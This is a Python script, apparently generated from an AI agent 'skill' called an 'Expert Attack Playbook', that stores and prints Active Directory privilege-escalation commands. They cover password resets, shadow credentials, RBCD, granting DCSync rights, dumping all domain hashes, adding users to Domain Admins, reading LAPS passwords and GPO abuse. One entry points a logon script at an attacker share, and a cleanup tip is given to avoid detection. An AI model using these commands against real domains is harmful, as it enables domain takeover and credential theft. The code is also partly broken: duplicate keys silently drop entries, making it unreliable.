#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
AUTO-GENERATED from Cybermes skill: hack-skills/active-directory-acl-abuse

Skill: SKILL: AD ACL Abuse — Expert Attack Playbook
Desc : >-

Run:  python hack-skills-active-directory-acl-abuse.py --help
      python hack-skills-active-directory-acl-abuse.py --list
      python hack-skills-active-directory-acl-abuse.py --dump <section>
"""
import sys, json, argparse

NAME = 'hack-skills/active-directory-acl-abuse'
TITLE = 'SKILL: AD ACL Abuse — Expert Attack Playbook'
DESCRIPTION = '>-'

PAYLOADS = {
    'main': ["name: active-directory-acl-abuse", "description: >-", "Active Directory ACL abuse playbook. Use when exploiting misconfigured AD permissions including GenericAll, WriteDACL, DCSync rights, shadow credentials, LAPS reading, GPO abuse, and BloodHound-guided attack paths."],
    'skill-ad-acl-abuse-expert-attack-playbook': [],
    '0-related-routing': ["Before going deep, consider loading:", "- [active-directory-kerberos-attacks](../active-directory-kerberos-attacks/SKILL.md) for Kerberos attacks often chained with ACL abuse", "- [active-directory-certificate-services](../active-directory-certificate-services/SKILL.md) for certificate-based attacks after ACL exploitation", "- [ntlm-relay-coercion](../ntlm-relay-coercion/SKILL.md) for relay attacks that can set ACLs (LDAP relay)", "- [windows-lateral-movement](../windows-lateral-movement/SKILL.md) after gaining elevated AD access"],
    'advanced-reference': ["Also load [BLOODHOUND_PATHS.md](./BLOODHOUND_PATHS.md) when you need:", "- Common BloodHound attack paths with Cypher queries", "- Custom Neo4j queries for finding complex chains", "- Data collection and ingestion tips"],
    '1-bloodhound-enumeration': [],
    'data-collection': ["```bash"],
    'sharphound-from-windows-domain-joined': ["SharpHound.exe -c all --outputdirectory C:\\temp --zipfilename bh.zip"],
    'bloodhound-python-from-linux': ["bloodhound-python -d domain.com -u user -p password -c all -dc DC01.domain.com -ns DC_IP"],
    'specific-collection-methods': ["SharpHound.exe -c DCOnly          # Fastest \u2014 only DC queries", "SharpHound.exe -c Session         # Session data only (run periodically)", "SharpHound.exe -c All,GPOLocalGroup  # Include GPO analysis"],
    'key-bloodhound-queries-built-in': ["- \"Find all Domain Admins\"", "- \"Shortest Paths to Domain Admins from Owned Principals\"", "- \"Find Principals with DCSync Rights\"", "- \"Shortest Paths to Unconstrained Delegation Systems\"", "- \"Find computers where Domain Users are Local Admin\""],
    '2-dangerous-ace-types': [],
    '3-ace-specific-exploitation': [],
    'genericall-on-user': ["```powershell"],
    'option-1-force-change-password': ["net user targetuser NewP@ss123 /domain"],
    'option-2-targeted-kerberoasting': ["Set-DomainObject -Identity targetuser -Set @{serviceprincipalname='fake/svc'}"],
    'kerberoast-then-clear-spn': [],
    'option-3-shadow-credentials': ["Whisker.exe add /target:targetuser /domain:domain.com /dc:DC01"],
    'option-4-set-logon-script': ["Set-DomainObject -Identity targetuser -Set @{scriptpath='\\\\attacker\\share\\evil.ps1'}"],
    'genericall-genericwrite-on-computer': ["```bash"],
    'rbcd-attack': ["rbcd.py -delegate-from 'CONTROLLED$' -delegate-to 'TARGET$' -action write DOMAIN/user:pass -dc-ip DC"],
    'shadow-credentials-on-computer': ["pywhisker.py -d domain.com -u user -p pass --target 'TARGET$' --action add --dc-ip DC"],
    'writedacl': ["```powershell"],
    'grant-dcsync-rights-to-yourself': ["Add-DomainObjectAcl -TargetIdentity \"DC=domain,DC=com\" -PrincipalIdentity lowpriv -Rights DCSync"],
    'impacket': ["dacledit.py -action write -rights DCSync -principal lowpriv -target-dn \"DC=domain,DC=com\" DOMAIN/lowpriv:pass -dc-ip DC"],
    'writeowner': ["```powershell"],
    'step-1-take-ownership': ["Set-DomainObjectOwner -Identity targetuser -OwnerIdentity lowpriv"],
    'step-2-grant-writedacl-to-yourself-as-owner': ["Add-DomainObjectAcl -TargetIdentity targetuser -PrincipalIdentity lowpriv -Rights All"],
    'step-3-now-exploit-as-genericall': [],
    'forcechangepassword': ["```bash"],
    'impacket': ["rpcclient -U 'DOMAIN/attacker%pass' DC01 -c \"setuserinfo2 targetuser 23 'NewP@ss123!'\""],
    'powerview': ["Set-DomainUserPassword -Identity targetuser -AccountPassword (ConvertTo-SecureString 'NewP@ss123!' -AsPlainText -Force)"],
    'net-rpc': ["net rpc password targetuser 'NewP@ss123!' -U DOMAIN/attacker%pass -S DC01"],
    'addmember-to-group': ["```powershell"],
    'add-self-to-privileged-group': ["Add-DomainGroupMember -Identity \"Domain Admins\" -Members lowpriv"],
    'impacket': ["net rpc group addmem \"Domain Admins\" lowpriv -U DOMAIN/attacker%pass -S DC01"],
    '4-dcsync-attack': [],
    'prerequisites': ["The principal needs **both** of these replication rights on the domain object:", "- `DS-Replication-Get-Changes` (GUID: `1131f6aa-9c07-11d1-f79f-00c04fc2dcd2`)", "- `DS-Replication-Get-Changes-All` (GUID: `1131f6ad-9c07-11d1-f79f-00c04fc2dcd2`)"],
    'execution': ["```bash"],
    'impacket-dump-all-hashes': ["secretsdump.py DOMAIN/user:password@DC01 -just-dc"],
    'specific-account-only': ["secretsdump.py DOMAIN/user:password@DC01 -just-dc-user krbtgt"],
    'mimikatz': ["lsadump::dcsync /domain:domain.com /user:krbtgt", "lsadump::dcsync /domain:domain.com /all /csv"],
    'impacket-with-kerberos-auth': ["export KRB5CCNAME=admin.ccache", "secretsdump.py -k -no-pass DC01.domain.com -just-dc"],
    'who-has-dcsync-by-default': ["- Domain Admins", "- Enterprise Admins", "- Domain Controllers group", "- `BUILTIN\\Administrators` (on domain object)"],
    '5-shadow-credentials': [],
    'attack-flow': ["Write `msDS-KeyCredentialLink` on target \u2192 generate certificate \u2192 authenticate via PKINIT.", "```bash"],
    'pywhisker-linux': ["pywhisker.py -d domain.com -u attacker -p pass --target victim --action add --dc-ip DC01"],
    'output-deviceid-and-pfx-file': [],
    'authenticate-with-certificate': ["gettgtpkinit.py -cert-pfx victim.pfx -pfx-pass RANDOM_PASS domain.com/victim victim.ccache", "export KRB5CCNAME=victim.ccache"],
    'extract-nt-hash-from-tgt-for-pass-the-hash': ["getnthash.py -key AS_REP_KEY domain.com/victim", "```powershell"],
    'whisker-windows': ["Whisker.exe add /target:victim /domain:domain.com /dc:DC01.domain.com"],
    'provides-rubeus-command-to-get-tgt': ["Rubeus.exe asktgt /user:victim /certificate:CERT_B64 /password:PASS /ptt", "**Cleanup**: Remove the added key credential to avoid detection."],
    '6-laps-password-reading': ["```powershell"],
    'powerview': ["Get-DomainComputer -Identity TARGET -Properties ms-Mcs-AdmPwd,ms-Mcs-AdmPwdExpirationTime"],
    'ad-module': ["Get-ADComputer -Identity TARGET -Properties ms-Mcs-AdmPwd | Select-Object ms-Mcs-AdmPwd"],
    'laps-v2-windows-laps': ["Get-LapsADPassword -Identity TARGET -AsPlainText"],
    'crackmapexec': ["crackmapexec ldap DC01 -u user -p pass --module laps"],
    '7-gpo-abuse': [],
    'identify-writable-gpos': ["```powershell"],
    'powerview-find-gpos-where-you-have-write-access': ["Get-DomainGPO | Get-DomainObjectAcl -ResolveGUIDs | Where-Object {", "($_.ActiveDirectoryRights -match 'WriteProperty|GenericAll|GenericWrite') -and", "($_.SecurityIdentifier -match 'YOUR_SID')"],
    'exploit-via-sharpgpoabuse': ["```cmd"],
    'add-local-admin-via-gpo': ["SharpGPOAbuse.exe --AddLocalAdmin --UserAccount lowpriv --GPOName \"Vulnerable GPO\""],
    'add-scheduled-task-via-gpo': ["SharpGPOAbuse.exe --AddComputerTask --TaskName \"Update\" --Author DOMAIN\\admin --Command \"cmd.exe\" --Arguments \"/c net localgroup administrators lowpriv /add\" --GPOName \"Vulnerable GPO\""],
    'add-startup-script': ["SharpGPOAbuse.exe --AddComputerScript --ScriptName \"evil.bat\" --ScriptContents \"net localgroup administrators lowpriv /add\" --GPOName \"Vulnerable GPO\"", "```bash"],
    'pygpoabuse-linux': ["pygpoabuse.py DOMAIN/user:pass -gpo-id \"GPO_GUID\" -command \"net localgroup administrators lowpriv /add\" -dc-ip DC01"],
    '8-acl-attack-decision-tree': ["Have domain user access \u2014 want to escalate via ACL", "\u251c\u2500\u2500 Run BloodHound \u2192 analyze shortest paths to DA", "\u2502   \u2514\u2500\u2500 Upload data \u2192 \"Shortest Paths to Domain Admins from Owned Principals\"", "\u251c\u2500\u2500 Direct ACL on user object?", "\u2502   \u251c\u2500\u2500 GenericAll \u2192 force password change, shadow creds, or targeted kerberoast (\u00a73)", "\u2502   \u251c\u2500\u2500 GenericWrite \u2192 shadow credentials or set SPN (\u00a73/\u00a75)", "\u2502   \u251c\u2500\u2500 ForceChangePassword \u2192 reset password directly (\u00a73)", "\u2502   \u251c\u2500\u2500 WriteDACL \u2192 grant yourself GenericAll, then exploit (\u00a73)", "\u2502   \u2514\u2500\u2500 WriteOwner \u2192 take ownership \u2192 WriteDACL \u2192 GenericAll (\u00a73)", "\u251c\u2500\u2500 ACL on group?", "\u2502   \u251c\u2500\u2500 AddMember / GenericAll \u2192 add self to privileged group (\u00a73)", "\u2502   \u2514\u2500\u2500 WriteDACL \u2192 grant AddMember, then add self", "\u251c\u2500\u2500 ACL on computer object?", "\u2502   \u251c\u2500\u2500 GenericAll/GenericWrite \u2192 RBCD attack (\u00a73)", "\u2502   \u251c\u2500\u2500 AllExtendedRights \u2192 read LAPS password (\u00a76)", "\u2502   \u2514\u2500\u2500 GenericWrite \u2192 shadow credentials on machine (\u00a75)", "\u251c\u2500\u2500 ACL on domain object?", "\u2502   \u251c\u2500\u2500 WriteDACL \u2192 grant DCSync rights to self (\u00a74)", "\u2502   \u2514\u2500\u2500 Replication rights already? \u2192 DCSync directly (\u00a74)", "\u251c\u2500\u2500 ACL on GPO linked to privileged OU?", "\u2502   \u2514\u2500\u2500 Write access \u2192 add admin / scheduled task via GPO (\u00a77)", "\u2514\u2500\u2500 Complex multi-hop chain?", "\u2514\u2500\u2500 Load BLOODHOUND_PATHS.md for Cypher queries and chain analysis"],
}

def main():
    ap = argparse.ArgumentParser(description=DESCRIPTION, formatter_class=argparse.RawDescriptionHelpFormatter)
    ap.add_argument("--list", action="store_true", help="list sections")
    ap.add_argument("--dump", metavar="SECTION", help="dump payloads for a section")
    ap.add_argument("--search", metavar="KEYWORD", help="search payloads")
    args = ap.parse_args()
    if args.list or not (args.dump or args.search):
        print("=== %s ===" % TITLE)
        print(DESCRIPTION)
        print()
        print("Sections (%d):" % len(PAYLOADS))
        for k in PAYLOADS:
            print("  -", k, "(%d payloads)" % len(PAYLOADS[k]))
        if args.list:
            return
    if args.dump:
        if args.dump not in PAYLOADS:
            print("Section not found. Available:", list(PAYLOADS.keys()))
            sys.exit(1)
        for p in PAYLOADS[args.dump]:
            print(p)
        return
    if args.search:
        q = args.search.lower()
        hits = 0
        for k, v in PAYLOADS.items():
            for p in v:
                if q in p.lower():
                    print("[%s] %s" % (k, p))
                    hits += 1
        print("\n%d hits" % hits)
        return

if __name__ == "__main__":
    main()